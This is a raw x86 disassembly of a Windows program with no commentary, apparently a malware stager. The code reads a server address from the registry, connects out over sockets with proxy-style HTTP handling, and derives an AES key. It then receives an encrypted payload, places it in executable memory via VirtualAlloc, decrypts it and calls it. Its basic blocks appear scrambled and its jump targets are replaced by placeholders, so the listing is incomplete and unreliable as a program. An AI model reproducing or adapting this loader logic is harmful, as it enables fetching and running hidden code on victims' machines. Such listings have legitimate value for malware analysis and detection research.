_start
push ebp
mov ebp esp
sub esp 0x508
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
mov [ rw-data ] eax
lea eax [ ebp - 0x3d0 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x404 ]
call sub_4015b0
call sub_401650
test eax eax
je r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_403072
mov esp ebp
pop ebp
retn
movzx eax [ ebp - 0x3fe ]
sub eax 0x1
mov edx [ ebp - 0x404 ]
je r-xdata
lea eax [ ebp - 0x224 ]
call sub_4016e0
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x3f8 ]
mov ecx [ ebp - 0x400 ]
push eax
push ecx
mov ecx [ ebp - 0x3f4 ]
push edx
mov edx [ ebp - 0x3fc ]
sub eax 0x1
je r-xdata
mov eax 0xfffffffe
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_403072
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_403072
mov esp ebp
pop ebp
retn
push 0xf0000000
xor edx edx
push 0x18
lea ecx [ ebp - 0x14 ]
xor eax ecx
push edx
mov [ ebp - 0x3ec ] eax
push edx
lea eax [ ebp - 0x3f0 ]
mov edi 0x10
push eax
mov [ ebp - 0x240 ] 0x8
mov [ ebp - 0x23f ] 0x2
mov [ ebp - 0x23c ] 0x660e
mov [ ebp - 0x23e ] dx
mov [ ebp - 0x238 ] edi
call [ CryptAcquireContextA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x3f8 ]
mov ecx [ ebp - 0x400 ]
push eax
push ecx
mov ecx [ ebp - 0x3f4 ]
push edx
mov edx [ ebp - 0x3fc ]
call sub_402bc0
jmp r-xdata
mov eax [ ebp - 0x400 ]
push edx
call sub_401dc0
add esp 0x4
jmp r-xdata
mov edx 0x3d
lea eax [ ebp - 0x224 ]
call sub_401840
test eax eax
jne r-xdata
push 0x2
push esi
call [ shutdown@IAT ]
push esi
call [ closesocket@IAT ]
mov edx [ ebp - 0x3f0 ]
lea ecx [ ebp - 0x3e8 ]
push ecx
push 0x0
push 0x0
push 0x8003
push edx
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
add esp 0xc
mov esi eax
mov [ ebp - 0x3d8 ] esi
cmp esi 0xffffffff
je r-xdata
mov edi r--data
lea eax [ ebp - 0x224 ]
call sub_401890
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x400 ]
mov edx [ ebp - 0x404 ]
push eax
push ecx
push edx
xor ecx ecx
lea edx [ ebp - 0x224 ]
jmp r-xdata
push 0x0
push 0x4
lea eax [ ebp - 0x3ec ]
push eax
push esi
call [ send@IAT ]
cmp eax 0x4
jne r-xdata
mov edi r--data
lea eax [ ebp - 0x224 ]
call sub_401890
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x224 ]
cmp esi eax
je r-xdata
call sub_401f00
lea ebx [ ebp - 0x14 ]
lea esp [ esp ]
mov eax 0xfffffffd
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_403072
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x224 ]
cmp esi ecx
je r-xdata
mov edx 0x3b
mov eax esi
call sub_401840
test eax eax
jne r-xdata
cmp [ esi - 0x2 ] 0x3b
jne r-xdata
push 0x0
push edi
push ebx
push esi
call [ recv@IAT ]
test eax eax
jle r-xdata
mov edx 0x3b
call sub_401840
test eax eax
jne r-xdata
cmp [ esi - 0x2 ] 0x3b
jne r-xdata
mov edx [ ebp - 0x400 ]
xor ecx ecx
push ecx
mov [ eax ] cx
mov eax [ ebp - 0x404 ]
push edx
push eax
lea edx [ esi + 0xa ]
jmp r-xdata
lea eax [ ebp + ebx * 2 - 0x224 ]
sub edi eax
add ebx eax
test edi edi
jg r-xdata
mov ecx [ ebp - 0x404 ]
xor edx edx
mov [ eax ] dx
mov eax [ ebp - 0x400 ]
push edx
push eax
push ecx
lea edx [ esi + 0xc ]
xor ecx ecx
call sub_402bc0
jmp r-xdata
lea eax [ ebp + ebx * 2 - 0x224 ]
lea ecx [ ebp - 0x3e0 ]
push ecx
push 0x0
push 0x0
lea edx [ ebp - 0x508 ]
push edx
push 0x0
mov [ ebp - 0x3e0 ] 0x1e
mov [ ebp - 0x3dc ] 0x0
mov [ ebp - 0x508 ] 0x1
mov [ ebp - 0x504 ] esi
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
test edi edi
sete al
test eax eax
je r-xdata
mov ecx [ ebp - 0x3e8 ]
push 0x0
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push ecx
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x3e8 ]
push 0x0
lea edx [ ebp - 0x238 ]
push edx
lea eax [ ebp - 0x234 ]
push eax
push 0x2
push ecx
call [ CryptGetHashParam@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x3f0 ]
lea edx [ ebp - 0x3e4 ]
push edx
push 0x0
push 0x0
push 0x1c
lea eax [ ebp - 0x240 ]
push eax
push ecx
call [ CryptImportKey@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x3d4 ] 0x1
mov edi 0x10
lea ebx [ ebp - 0x24 ]
push 0x0
push edi
push ebx
push esi
call [ recv@IAT ]
test eax eax
jle r-xdata
sub edi eax
add ebx eax
test edi edi
jg r-xdata
lea edx [ ebp - 0x3e0 ]
push edx
push 0x0
push 0x0
lea eax [ ebp - 0x508 ]
push eax
push 0x0
mov [ ebp - 0x3e0 ] 0x1e
mov [ ebp - 0x3dc ] 0x0
mov [ ebp - 0x508 ] 0x1
mov [ ebp - 0x504 ] esi
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
test edi edi
sete al
test eax eax
je r-xdata
mov edx [ ebp - 0x3e4 ]
mov edi [ CryptSetKeyParam@IAT ]
push 0x0
lea ecx [ ebp - 0x3d4 ]
push ecx
push 0x4
push edx
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x3e4 ]
push 0x0
lea eax [ ebp - 0x24 ]
push eax
push 0x1
push ecx
call edi
test eax eax
je r-xdata
mov edi 0x4
lea ebx [ ebp - 0x3d4 ]
push 0x0
push edi
push ebx
push esi
call [ recv@IAT ]
test eax eax
jle r-xdata
sub edi eax
add ebx eax
test edi edi
jg r-xdata
lea edx [ ebp - 0x3e0 ]
push edx
push 0x0
push 0x0
lea eax [ ebp - 0x508 ]
push eax
push 0x0
mov [ ebp - 0x3e0 ] 0x1e
mov [ ebp - 0x3dc ] 0x0
mov [ ebp - 0x508 ] 0x1
mov [ ebp - 0x504 ] esi
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
test edi edi
sete al
test eax eax
je r-xdata
mov eax [ ebp - 0x3d4 ]
xor eax [ ebp - 0x3ec ]
push 0x40
push 0x3000
push eax
push 0x0
mov [ ebp - 0x3d4 ] eax
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x3dc ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0x3d4 ]
mov ebx eax
mov eax [ ebp - 0x3dc ]
mov ecx [ ebp - 0x3e4 ]
lea edx [ ebp - 0x3d4 ]
push edx
push eax
push 0x0
push 0x1
push 0x0
push ecx
call [ CryptDecrypt@IAT ]
mov edi [ ebp - 0x3d8 ]
call [ ebp - 0x3dc ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_403072
mov esp ebp
pop ebp
retn
push 0x0
push edi
push ebx
push esi
call [ recv@IAT ]
test eax eax
jle r-xdata
sub edi eax
add ebx eax
test edi edi
jg r-xdata
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x508 ]
push ecx
push 0x0
mov [ ebp - 0x508 ] 0x1
mov [ ebp - 0x504 ] esi
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
sub_4015b0
push 0x14
push 0x0
push edx
call sub_401cc0
xor eax eax
mov [ edx ] rw-data
cmp [ rw-data ] al
je r-xdata
mov cx [ eax + rw-data ]
lea eax [ eax + rw-data ]
add eax 0x2
mov [ edx + 0x4 ] cx
mov cl [ eax ]
mov [ edx + 0x6 ] cl
test cl cl
je r-xdata
lea ebx [ ebx ]
retn
add eax 0x1
mov [ edx + 0x8 ] eax
mov ecx 0x0
je r-xdata
inc eax
cmp [ eax + rw-data ] 0x0
jne r-xdata
lea eax [ eax + ecx * 2 + 0x1 ]
mov cl [ eax ]
mov [ edx + 0xc ] eax
test cl cl
je r-xdata
cmp [ eax ] cx
je r-xdata
cmp cl 0x1
je r-xdata
lea esp [ esp ]
xor ecx ecx
cmp [ eax ] cx
je r-xdata
inc ecx
cmp [ eax + ecx * 2 ] 0x0
jne r-xdata
lea eax [ eax + ecx * 2 + 0x1 ]
mov [ edx + 0x10 ] eax
inc ecx
cmp [ eax + ecx * 2 ] 0x0
jne r-xdata
sub_401650
sub esp 0x10
push esi
lea eax [ esp + 0x4 ]
push eax
push 0x1
push 0x0
push r--data
push 0x80000001
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x1c ] 0x4
mov [ esp + 0x18 ] 0x80000001
or esi 0xffffffff
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop esi
add esp 0x10
retn
lea ecx [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x18 ]
push eax
push 0x0
push r--data
push ecx
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x4 ]
push edx
call [ RegCloseKey@IAT ]
cmp esi 0x4
jne r-xdata
mov esi [ esp + 0x8 ]
cmp [ esp + 0x10 ] esi
je r-xdata
mov eax [ esp + 0xc ]
pop esi
add esp 0x10
retn
sub_4016e0
sub esp 0xc
push ebx
push esi
mov esi eax
lea eax [ esp + 0x8 ]
push eax
push 0x1
push 0x0
push r--data
push 0x80000001
mov [ esp + 0x20 ] 0x200
mov [ esp + 0x1c ] 0x80000001
or ebx 0xffffffff
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push esi
lea edx [ esp + 0x18 ]
push edx
push eax
mov eax [ esp + 0x18 ]
push r--data
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
pop esi
or eax 0xffffffff
pop ebx
add esp 0xc
retn
test bl 0x1
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ RegCloseKey@IAT ]
mov ebx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
cmp eax 0x1
je r-xdata
test ebx ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
shr ebx 0x1
dec ebx
cmp [ esi + ebx * 2 ] 0x0
je r-xdata
xor edx edx
mov [ esi ] dx
pop esi
mov eax ebx
pop ebx
add esp 0xc
retn
cmp ebx 0x2
jbe r-xdata
inc ebx
cmp ebx 0x100
jae r-xdata
pop esi
mov eax ebx
pop ebx
add esp 0xc
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
mov [ esi + ebx * 2 ] cx
push edi
mov eax ebx
call sub_4017f0
mov edi eax
test edi edi
je r-xdata
or ebx 0xffffffff
push 0x100
push esi
push edi
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
jne r-xdata
pop edi
mov edx [ rw-data ]
push edi
push 0x0
push edx
call [ HeapFree@IAT ]
test edi edi
je r-xdata
sub_4017f0
test esi esi
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
xor eax eax
retn
push edi
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
test eax eax
jne r-xdata
xor eax eax
cmp [ esi ] ax
je r-xdata
add eax 0x4
push eax
mov eax [ rw-data ]
push 0x8
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
pop edi
retn
inc eax
cmp [ esi + eax * 2 ] 0x0
jne r-xdata
pop edi
retn
push edi
push esi
push eax
call sub_401ca0
sub_401840
movzx ecx [ eax ]
test cx cx
je r-xdata
cmp [ eax ] dx
je r-xdata
movzx ecx cx
jmp r-xdata
retn
xor eax eax
cmp cx dx
je r-xdata
movzx ecx [ eax + 0x2 ]
add eax 0x2
test cx cx
jne r-xdata
sub_401890
push ebx
push esi
mov esi eax
movzx ecx [ esi ]
test cx cx
je r-xdata
xor eax eax
movzx edx cx
sub esi edi
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
pop esi
pop ebx
retn
movzx edx [ eax + 0x2 ]
add eax 0x2
add esi 0x2
test dx dx
jne r-xdata
movzx ebx [ esi + ecx ]
movzx edx dx
sub ebx edx
jne r-xdata
mov ecx edi
test dx dx
je r-xdata
add ecx 0x2
cmp [ esi + ecx ] bx
jne r-xdata
sub_4018e0
movzx ecx [ edx ]
push esi
push edi
xor eax eax
xor edi edi
cmp cx 0x2d
jne r-xdata
cmp cx 0x2b
jne r-xdata
lea edi [ eax + 0x1 ]
jmp r-xdata
movzx ecx [ edx ]
cmp cx 0x30
jne r-xdata
add edx 0x2
movzx ecx cx
cmp cx 0x30
jb r-xdata
movzx esi [ edx + 0x2 ]
cmp si 0x78
je r-xdata
test edi edi
pop edi
pop esi
je r-xdata
lea ecx [ ecx ]
add edx 0x4
lea esp [ esp ]
cmp si 0x58
jne r-xdata
retn
neg eax
movzx ecx cx
lea eax [ eax + eax * 4 ]
add edx 0x2
lea eax [ ecx + eax * 2 - 0x30 ]
movzx ecx [ edx ]
cmp cx 0x30
jae r-xdata
lea esi [ ecx - 0x61 ]
cmp si 0x5
ja r-xdata
movzx ecx si
movzx ecx cx
shl eax 0x4
add eax ecx
add edx 0x2
jmp r-xdata
cmp cx 0x39
ja r-xdata
lea esi [ ecx - 0x41 ]
cmp si 0x5
ja r-xdata
add ecx 0xffa9
movzx ecx cx
shl eax 0x4
add eax ecx
add edx 0x2
jmp r-xdata
movzx ecx [ edx ]
lea esi [ ecx - 0x30 ]
cmp si 0x9
ja r-xdata
add ecx 0xffc9
movzx ecx cx
shl eax 0x4
add eax ecx
add edx 0x2
jmp r-xdata
sub_4019b0
push ecx
mov ecx [ esp + 0xc ]
push esi
push edi
lea eax [ esp + 0x18 ]
push eax
push ecx
xor eax eax
lea edi [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x0
call sub_401a10
mov esi eax
mov eax [ esp + 0x10 ]
add esp 0x8
test esi esi
jge r-xdata
mov ecx [ esp + 0x10 ]
mov [ ecx ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ecx
retn
mov edx [ rw-data ]
push eax
push 0x0
push edx
call [ HeapFree@IAT ]
pop edi
mov eax esi
pop esi
pop ecx
retn
sub_401a10
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov ebx eax
xor eax eax
push esi
test ebp ebp
je r-xdata
mov esi eax
lea ecx [ ecx ]
cmp [ ebp ] al
je r-xdata
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov eax [ edi ]
lea ecx [ esi + ebx + 0x1 ]
test ecx ecx
jne r-xdata
inc eax
cmp [ eax + ebp ] 0x0
jne r-xdata
add ecx 0x4
push ecx
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
push eax
push 0x8
push edx
call [ HeapReAlloc@IAT ]
mov ecx [ rw-data ]
push 0x8
push ecx
call [ HeapAlloc@IAT ]
jmp r-xdata
mov [ edi ] 0x0
jmp r-xdata
push eax
mov eax [ rw-data ]
push ecx
push eax
call [ HeapFree@IAT ]
mov [ edi ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ edi ]
push eax
push ebp
push esi
add ecx ebx
push ecx
call [ wvnsprintfA@IAT ]
test eax eax
jl r-xdata
add esi 0x200
cmp esi 0xa00000
ja r-xdata
lea edx [ esi - 0x1 ]
cmp eax edx
jge r-xdata
add ebx eax
mov eax [ edi ]
pop esi
mov [ ebx + eax ] 0x0
pop ebp
mov eax ebx
pop ebx
retn
sub_401ad0
mov ecx [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi eax
mov ebx [ esi ]
push edi
lea eax [ esp + 0x1c ]
push eax
push ecx
mov eax ebp
mov edi esi
call sub_401a10
mov edi eax
add esp 0x8
cmp edi 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
test ebp ebp
jne r-xdata
lea ecx [ ebp + 0x1 ]
call sub_401d10
mov eax edi
test ebx ebx
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov edx [ rw-data ]
push eax
push ebx
push edx
call [ HeapFree@IAT ]
sub_401b30
cmp [ edi ] 0x0
push esi
mov esi eax
je r-xdata
pop esi
retn
mov dl [ esi ]
push ebx
test dl dl
je r-xdata
xor eax eax
sub esi edi
cmp [ ecx ] 0x0
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
pop ebx
mov dl [ eax + 0x1 ]
inc eax
inc esi
test dl dl
jne r-xdata
movsx ebx [ esi + ecx ]
movsx edx dl
sub ebx edx
jne r-xdata
mov ecx edi
test dl dl
je r-xdata
inc ecx
cmp [ esi + ecx ] bl
jne r-xdata
sub_401b80
mov al [ edx ]
push esi
push edi
xor esi esi
xor edi edi
cmp al 0x2d
jne r-xdata
cmp al 0x2b
jne r-xdata
lea edi [ esi + 0x1 ]
jmp r-xdata
mov cl [ edx ]
push ebx
cmp cl 0x30
jne r-xdata
inc edx
jl r-xdata
mov al [ edx + 0x1 ]
cmp al 0x78
je r-xdata
pop ebx
test edi edi
je r-xdata
lea ebx [ ebx ]
add edx 0x2
lea esp [ esp ]
cmp al 0x58
jne r-xdata
pop edi
mov eax esi
pop esi
retn
neg esi
movsx ecx cl
lea eax [ esi + esi * 4 ]
inc edx
lea esi [ ecx + eax * 2 - 0x30 ]
mov cl [ edx ]
cmp cl 0x30
jge r-xdata
mov al cl
sub al 0x61
cmp al 0x5
ja r-xdata
mov cl bl
movsx ecx cl
shl esi 0x4
add esi ecx
inc edx
jmp r-xdata
cmp cl 0x30
cmp cl 0x39
jg r-xdata
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xa9
movsx ecx cl
shl esi 0x4
add esi ecx
inc edx
jmp r-xdata
mov cl [ edx ]
mov bl cl
sub bl 0x30
cmp bl 0x9
ja r-xdata
add cl 0xc9
movsx ecx cl
shl esi 0x4
add esi ecx
inc edx
jmp r-xdata
sub_401c30
mov edx [ esp + 0x4 ]
test edi edi
jg r-xdata
push edi
push 0x0
push esi
call sub_401cc0
lea eax [ esp + 0x8 ]
push eax
push edx
push edi
push esi
call [ wvnsprintfA@IAT ]
mov [ esi + edi - 0x1 ] 0x0
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
retn
mov [ eax + esi ] 0x0
xor eax eax
test esi esi
je r-xdata
retn
cmp [ esi ] al
je r-xdata
inc eax
cmp [ eax + esi ] 0x0
jne r-xdata
retn
sub_401ce0
test eax eax
jne r-xdata
add eax 0x4
push eax
test ecx ecx
jne r-xdata
retn
push ecx
mov ecx [ rw-data ]
push 0x8
push ecx
call [ HeapReAlloc@IAT ]
retn
mov eax [ rw-data ]
push 0x8
push eax
call [ HeapAlloc@IAT ]
retn
sub_401d10
mov eax [ esi ]
test ecx ecx
jne r-xdata
add ecx 0x4
push ecx
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
push eax
push 0x8
push edx
call [ HeapReAlloc@IAT ]
mov ecx [ rw-data ]
push 0x8
push ecx
call [ HeapAlloc@IAT ]
jmp r-xdata
mov [ esi ] 0x0
mov eax 0x1
retn
push eax
mov eax [ rw-data ]
push ecx
push eax
call [ HeapFree@IAT ]
mov [ esi ] eax
mov eax 0x1
retn
retn
test eax eax
jne r-xdata
sub_401d70
movzx eax [ edi ]
push esi
push 0x6
push 0x1
push eax
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
retn
xor ecx ecx
cmp [ edi ] 0x2
setne cl
dec ecx
and ecx 0xfffffff4
add ecx 0x1c
push ecx
push edi
push esi
call [ connect@IAT ]
test eax eax
je r-xdata
mov eax esi
push esi
call [ closesocket@IAT ]
or eax 0xffffffff
pop esi
retn
sub_401dc0
sub esp 0xc
mov ecx eax
shr ecx 0x8
movzx ax al
movzx dx cl
push ebx
shl ax 0x8
or dx ax
mov eax [ esp + 0x14 ]
push ebp
movzx ecx dx
lea edx [ esp + 0xc ]
push edx
xor ebx ebx
push ebx
push ebx
push eax
xor ebp ebp
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ecx
call [ getaddrinfo@IAT ]
test eax eax
je r-xdata
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc
retn
push edi
call [ freeaddrinfo@IAT ]
or esi 0xffffffff
test ebp ebp
je r-xdata
mov eax [ edi + 0x4 ]
cmp eax 0x2
jne r-xdata
test ebx ebx
je r-xdata
mov dx [ esp + 0x18 ]
mov edi ebp
mov [ ebp + 0x2 ] dx
call sub_401d70
mov esi eax
cmp eax 0x17
jne r-xdata
mov esi [ edi + 0x10 ]
mov ebx [ edi + 0x18 ]
test esi esi
jne r-xdata
mov edi [ HeapFree@IAT ]
test ebp ebp
je r-xdata
cmp esi 0xffffffff
jne r-xdata
mov edi [ edi + 0x1c ]
test edi edi
jne r-xdata
mov esi [ edi + 0x10 ]
mov ebx [ edi + 0x18 ]
test esi esi
jne r-xdata
mov edx [ rw-data ]
lea ecx [ esi + 0x4 ]
push ecx
push 0x0
push edx
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
mov ebp eax
jmp r-xdata
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
push ebp
push 0x0
push ecx
call edi
mov ax [ esp + 0x18 ]
mov edi ebx
mov [ ebx + 0x2 ] ax
call sub_401d70
mov esi eax
mov edi [ esp + 0x14 ]
mov ecx [ rw-data ]
lea eax [ esi + 0x4 ]
push eax
push 0x0
push ecx
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov ebp eax
jmp r-xdata
push esi
push ebx
push eax
call sub_401ca0
mov ebx [ esp + 0x10 ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov edx [ rw-data ]
push ebx
push 0x0
push edx
call edi
mov [ esp + 0x10 ] eax
push esi
push ebx
push eax
call sub_401ca0
sub_401f00
sub esp 0x12c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x128 ] eax
mov eax [ esp + 0x130 ]
push ebx
mov ebx [ esp + 0x13c ]
push esi
mov esi edx
mov [ esp + 0x10 ] eax
mov ax [ esp + 0x13c ]
mov [ esp + 0x24 ] ecx
movzx ecx [ esi ]
mov [ esp + 0x14 ] ax
lea eax [ esp + 0x2c ]
mov edx 0x50
mov [ esp + 0x18 ] eax
push edi
mov [ esp + 0x20 ] dx
mov [ esp + 0x24 ] ebx
mov eax esi
test cx cx
je r-xdata
cmp [ eax ] 0x3a
jne r-xdata
movzx ecx cx
nop
xor eax eax
cmp [ esi ] ax
je r-xdata
xor ecx ecx
lea edx [ eax + 0x2 ]
mov [ eax ] cx
call sub_4018e0
mov [ esp + 0x20 ] ax
movzx ecx [ eax + 0x2 ]
add eax 0x2
test cx cx
jne r-xdata
push 0x0
push 0x0
push 0x100
lea edx [ esp + 0x3c ]
push edx
push eax
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
cmp eax 0x100
jl r-xdata
inc eax
cmp [ esi + eax * 2 ] 0x0
jne r-xdata
cmp cx 0x3a
je r-xdata
mov [ esp + eax + 0x30 ] 0x0
test eax eax
jne r-xdata
xor eax eax
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x24 ]
call sub_401dc0
add esp 0x4
mov [ esp + 0x10 ] eax
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x128 ]
xor ecx esp
call sub_403072
add esp 0x12c
retn
mov ecx [ esp + 0x134 ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_403072
add esp 0x12c
retn
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x14 ]
push edx
xor eax eax
xor ecx ecx
call sub_4020b0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov edi r--data
call sub_401b30
cmp eax esi
jne r-xdata
mov eax [ esp + 0x10 ]
mov edi eax
cmp eax 0xffffffff
je r-xdata
lea edx [ esi + 0x9 ]
call sub_401b80
cmp eax 0xc8
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
push 0x2
push eax
call [ shutdown@IAT ]
push edi
call [ closesocket@IAT ]
mov ecx [ rw-data ]
push esi
push 0x0
push ecx
call [ HeapFree@IAT ]
cmp eax 0x197
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ esp + 0x2c ]
push eax
push esi
lea ebx [ esp + 0x18 ]
call sub_4023e0
add esp 0x8
jmp r-xdata
sub_4020b0
sub esp 0x22c
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x240 ]
mov edx [ edi + 0x4 ]
mov ebx ecx
movzx ecx [ edi + 0x8 ]
push ecx
mov esi eax
mov eax [ esp + 0x248 ]
xor ebp ebp
push edx
mov [ eax ] ebp
lea eax [ esp + 0x18 ]
push r--data
push eax
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] ebp
call sub_4019b0
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov esi [ edi ]
cmp esi 0xffffffff
je r-xdata
push r--data
push r--data
push eax
lea eax [ esp + 0x1c ]
call sub_401ad0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov [ edi ] 0xffffffff
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x22c
retn
push 0x2
push esi
call [ shutdown@IAT ]
push esi
call [ closesocket@IAT ]
mov ecx [ edi + 0x4 ]
push ecx
push r--data
push eax
lea eax [ esp + 0x1c ]
call sub_401ad0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp ebx ebp
je r-xdata
cmp eax 0xffffffff
je r-xdata
cmp esi ebp
je r-xdata
push r--data
push eax
lea eax [ esp + 0x18 ]
call sub_401ad0
mov esi eax
add esp 0x8
cmp esi 0xffffffff
je r-xdata
push esi
push ebx
push r--data
push eax
lea eax [ esp + 0x20 ]
call sub_401ad0
add esp 0x10
mov ebx [ esp + 0x10 ]
mov eax [ edi ]
push ebp
push esi
push ebx
push eax
call [ send@IAT ]
xor edx edx
cmp eax esi
sete dl
mov esi edx
cmp ebx ebp
je r-xdata
cmp esi ebp
je r-xdata
mov eax [ rw-data ]
push ebx
push ebp
push eax
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
push 0x204
push 0x8
push ecx
call [ HeapAlloc@IAT ]
xor ebx ebx
mov eax ebp
mov [ edi ] 0xffffffff
call sub_401c80
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x22c
retn
push 0x0
push 0x200
lea ecx [ ebx + ebp ]
push ecx
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
test ebp ebp
je r-xdata
add ebx eax
mov edi r--data
mov eax ebp
mov [ ebx + ebp ] 0x0
call sub_401b30
mov esi eax
test esi esi
jne r-xdata
mov ecx [ rw-data ]
push ebp
push 0x0
push ecx
call [ HeapFree@IAT ]
jmp r-xdata
mov edi r--data
mov eax ebp
mov [ esi ] 0x0
call sub_401b30
test eax eax
je r-xdata
lea eax [ ebx + 0x200 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
lea edx [ eax + 0x11 ]
call sub_401b80
jmp r-xdata
mov edi [ esp + 0x240 ]
add eax 0x4
push eax
test ebp ebp
jne r-xdata
sub esi ebx
sub esi ebp
lea esi [ eax + esi + 0x4 ]
lea eax [ esi + ebx ]
mov ecx ebp
mov [ esp + 0x14 ] eax
call sub_401ce0
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x244 ]
sub esi ebp
add esi 0x4
mov [ ecx ] esi
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x22c
retn
mov [ esi ] 0xd
test eax eax
jne r-xdata
mov eax [ rw-data ]
push ebp
push 0x8
push eax
call [ HeapReAlloc@IAT ]
mov edx [ rw-data ]
push 0x8
push edx
call [ HeapAlloc@IAT ]
jmp r-xdata
mov edx [ esp + 0x240 ]
lea edi [ eax + ebx ]
mov ebx [ edx ]
mov ebp eax
mov edi [ esp + 0x240 ]
jmp r-xdata
test eax eax
je r-xdata
mov edi [ esp + 0x240 ]
push 0x0
push esi
push edi
push ebx
call [ recv@IAT ]
test eax eax
jle r-xdata
mov esi [ edi ]
lea edx [ esp + 0x18 ]
push edx
push 0x0
mov ebp eax
push 0x0
lea eax [ esp + 0x34 ]
push eax
push 0x0
mov [ esp + 0x2c ] 0x1e
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x3c ] 0x1
mov [ esp + 0x40 ] esi
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
sub esi eax
add edi eax
test esi esi
jg r-xdata
lea eax [ esp + 0x20 ]
push eax
push 0x0
push 0x0
